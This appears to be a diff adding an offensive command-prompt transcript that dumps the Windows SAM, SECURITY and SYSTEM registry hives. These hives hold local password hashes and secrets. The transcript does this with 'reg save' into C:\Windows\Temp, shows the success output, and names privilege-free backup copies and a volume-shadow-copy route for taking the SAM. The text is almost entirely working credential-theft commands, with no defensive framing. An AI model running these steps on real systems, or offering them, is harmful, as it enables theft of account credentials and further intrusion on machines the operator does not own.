@@ -1,0 +1,27 @@
+:: Offline capture of the three hives that hold local secrets.
+:: Run from an elevated / SYSTEM context. Hives are locked while online, so
+:: `reg save` (uses the backup privilege) or a VSS copy is the usual route.
+
+C:\Windows\system32> reg save HKLM\SAM      C:\Windows\Temp\sam.hive
+The operation completed successfully.
+
+C:\Windows\system32> reg save HKLM\SECURITY C:\Windows\Temp\security.hive
+The operation completed successfully.
+
+C:\Windows\system32> reg save HKLM\SYSTEM   C:\Windows\Temp\system.hive
+The operation completed successfully.
+
+C:\Windows\system32> dir C:\Windows\Temp\*.hive
+ Volume in drive C has no label.
+
+06/14/2026  09:41 PM            65,536 sam.hive
+06/14/2026  09:41 PM            32,768 security.hive
+06/14/2026  09:41 PM        14,680,064 system.hive
+               3 File(s)     14,778,368 bytes
+
+:: Frequently-readable copies that need no privilege at all:
+::   C:\Windows\System32\config\RegBack\{SAM,SECURITY,SYSTEM}
+::   C:\Windows\repair\{sam,security,system}
+:: Or from a shadow copy:
+C:\> vssadmin create shadow /for=C:
+C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Windows\Temp\sam.hive
